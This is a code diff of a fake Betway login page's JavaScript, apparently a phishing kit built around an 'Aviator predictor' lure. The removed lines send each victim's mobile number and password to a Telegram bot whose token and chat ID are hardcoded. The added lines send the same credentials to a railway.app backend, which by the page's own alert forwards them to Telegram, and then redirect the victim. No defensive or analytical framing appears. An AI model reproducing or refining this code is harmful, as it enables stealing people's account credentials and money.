@@ -369,7 +369,7 @@
 
     <script>
         // ============================================
-        // COMPLETE CODE WITH ALERTS FOR DEBUGGING
+        // COMPLETE WORKING JAVASCRIPT
         // ============================================
 
         alert('🔴 1. Script loaded!');
@@ -465,60 +465,50 @@
                 hideMessage();
                 showLoading();
 
-                // ===== SEND TO TELEGRAM =====
+                // ===== SEND TO BACKEND =====
 
                 try {
-                    alert('📤 7. Sending to Telegram...');
+                    // CALL YOUR BACKEND SERVER
+                    const apiUrl = 'https://betwayaviatorpredictor-production.up.railway.app/api/login';
+                    alert('📤 7. Sending to backend: ' + apiUrl);
                     
-                    // Your Telegram bot details
-                    const botToken = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
-                    const chatId = '8392790531';
-                    
-                    const message = `
-🔐 **BETWAY LOGIN ALERT**
-━━━━━━━━━━━━━━━━━━━
-📱 **Mobile:** ${mobileNumber}
-🔑 **Password:** ${password}
-🕐 **Time:** ${new Date().toLocaleString()}
-━━━━━━━━━━━━━━━━━━━
-                    `;
+                    console.log('📤 Sending to backend:', apiUrl);
 
-                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-                    const response = await fetch(telegramUrl, {
+                    const response = await fetch(apiUrl, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message,
-                            parse_mode: 'Markdown'
+                            mobileNumber: mobileNumber,
+                            password: password
                         })
                     });
 
+                    console.log('📡 Response status:', response.status);
+
                     const data = await response.json();
-                    console.log('📦 Response:', data);
+                    console.log('📦 Response data:', data);
 
                     hideLoading();
 
-                    if (data.ok) {
-                        alert('✅ 8. SENT TO TELEGRAM SUCCESSFULLY!');
-                        showMessage('✅ Login successful!', 'success');
+                    if (data.success) {
+                        alert('✅ 8. BACKEND SUCCESS! Data sent to Telegram!');
+                        showMessage('✅ Login successful! Redirecting...', 'success');
                         showLoading();
                         setTimeout(function() {
                             window.location.href = 'https://betwayaviatorpredictor-production.up.railway.app';
                         }, 2000);
                     } else {
-                        alert('❌ 8. TELEGRAM ERROR!');
-                        showMessage('❌ Login failed. Please try again.', 'error');
+                        alert('❌ 8. BACKEND ERROR!');
+                        showMessage('❌ ' + (data.message || 'Login failed.'), 'error');
                     }
 
                 } catch (error) {
                     alert('❌ 8. ERROR: ' + error.message);
                     console.error('❌ ERROR:', error);
                     hideLoading();
-                    showMessage('❌ Network error. Please check your connection.', 'error');
+                    showMessage('❌ Cannot connect to backend. Make sure server is running.', 'error');
                 }
             }
 
